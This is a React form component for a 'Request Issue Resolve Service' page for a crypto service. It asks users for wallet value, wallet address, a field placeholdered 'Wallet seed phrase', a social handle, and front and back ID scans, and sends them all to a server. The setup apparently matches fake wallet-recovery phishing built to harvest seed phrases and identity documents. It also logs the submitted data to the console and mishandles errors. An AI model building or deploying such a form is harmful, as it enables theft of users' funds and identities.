import React, { useState } from "react";
import InputField from "../forms/InputField";
import CustomFormik from "../../utils/CustomFormik";
import { validateRequestService } from "../../utils/validate";
import { requestServiceValues } from "../../utils/initialValues";
import SubmitButton from "../forms/SubmitButton";
import { useNavigate } from "react-router-dom";
import { errorNotification, successNotification } from "../../utils/helpers";
import axios from "axios";
import SelectSocialField from "../forms/SelectSocial";
axios.defaults.withCredentials = true;

const RequestServiceBody = ({ data }) => {
  const initialValues = requestServiceValues(data);
  const validationSchema = validateRequestService();
  const history = useNavigate();

  const [iDFront, setIDFront] = useState();
  const [iDBack, setIDBack] = useState();
  const [iDFrontError, setIDFrontError] = useState(null);
  const [iDBackError, setIDBackError] = useState(null);
  const handleIDFrontImageChange = (e) => {
    setIDFront(e.target.files[0]);
  };
  const handleIDBackImageChange = (e) => {
    setIDBack(e.target.files[0]);
  };

  const handleSubmit = async (values) => {
    console.log(values);

    if (!iDFront) {
      setIDFrontError("Please provide a valid ID doc front");
    } else {
      setIDFrontError(null);
      if (!iDBack) {
        setIDBackError("Please provide a valid ID doc back");
      } else {
        setIDBackError(null);
        const formData = new FormData();
        formData.append("iDFront", iDFront);
        formData.append("iDBack", iDBack);
        formData.append("service", data.title);
        formData.append("walletValue", values.walletValue);
        formData.append("walletAddress", values.walletAddress);
        formData.append("social", values.social);
        formData.append("socialHandle", values.socialHandle);

        console.log("formData", ...formData);

        const response = await axios.post(
          `${import.meta.env.VITE_API_URL}/user-profile/request-service`,
          formData,
          { withCredentials: true }
        );
        console.log(response);
        try {
          if (response.status === 200) {
            const data = response.data;
            successNotification(data.message);
            history("/my-requests");
          } else {
            if (response.status === 209) {
              history("/login");
            }
            errorNotification(response?.data?.error);
            // errorNotification("Something went wrong");
          }
        } catch (error) {
          // errorNotification("Something went wrong");
          errorNotification(error?.response?.data?.error);
        }
      }
    }
  };

  return (
    <>
      <div className="h-full md:h-[80vh] w-[100vw] bg-[#0A0D16]">
        <div className="max-w-[600px] mx-auto pt-[80px] pb-[170px] md:py-0 px-5 md:px-0 flex flex-col h-full justify-center gap-8 bg-[#0A0D16]">
          <div className="flex flex-col gap-1">
            <div className="text-[16px] md:text-[22px] font-bold">
              Request Issue Resolve Service for{" "}
              <span className="text-white">{data.title}</span>
            </div>
            <div className="text-[14px] md:text-[15px] font-bold">
              Let's help you {data.description.toLowerCase()}
            </div>
          </div>
          <div className="overflow-x-scroll pt-8 pb-2">
            <div className="w-[100%]">
              <CustomFormik
                initialValues={initialValues}
                validationSchema={validationSchema}
                onSubmit={handleSubmit}
              >
                <div className="font-bold text-[14.5px] md:text-[18px] uppercase grid grid-cols-1 gap-8 md:grid-cols-2 w-[100%] p-2 mb-2">
                  <InputField name="service" disabled={true} />
                  <InputField
                    name="walletValue"
                    placeholder="Estimated wallet value ($)"
                  />
                  <InputField
                    name="walletAddress"
                    placeholder="Wallet address"
                    full={true}
                  />
                  <SelectSocialField
                    name="social"
                    placeholder="Wallet seed phrase"
                  />
                  <InputField
                    name="socialHandle"
                    placeholder="Your social media handle"
                  />
                  <div className="">
                    <label
                      htmlFor=""
                      className="text-[14px] font-[400] lowercase"
                    >
                      Valid ID Front
                    </label>
                    <input
                      type="file"
                      onChange={handleIDFrontImageChange}
                      name="iDFront"
                      required={true}
                      className="border rounded-md w-[100%] bg-transparent p-3 text-[14px] font-[400]"
                    />
                    {iDFrontError ? (
                      <p className="pt-1 pb-0 m-0 text-red-400 text-[12px] lowercase">
                        {iDFrontError}
                      </p>
                    ) : null}
                  </div>
                  <div className="">
                    <label
                      htmlFor=""
                      className="text-[14px] font-[400] lowercase"
                    >
                      Valid ID Back
                    </label>
                    <input
                      type="file"
                      onChange={handleIDBackImageChange}
                      name="iDBack"
                      required={true}
                      className="border rounded-md w-[100%] bg-transparent p-3 text-[14px] font-[400]"
                    />
                    {iDBackError ? (
                      <p className="pt-1 pb-0 m-0 text-red-400 text-[12px] lowercase">
                        {iDBackError}
                      </p>
                    ) : null}
                  </div>
                </div>
                <SubmitButton
                  title="Submit Issue Details"
                  className="mt-10 w-[100%]"
                />
              </CustomFormik>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default RequestServiceBody;
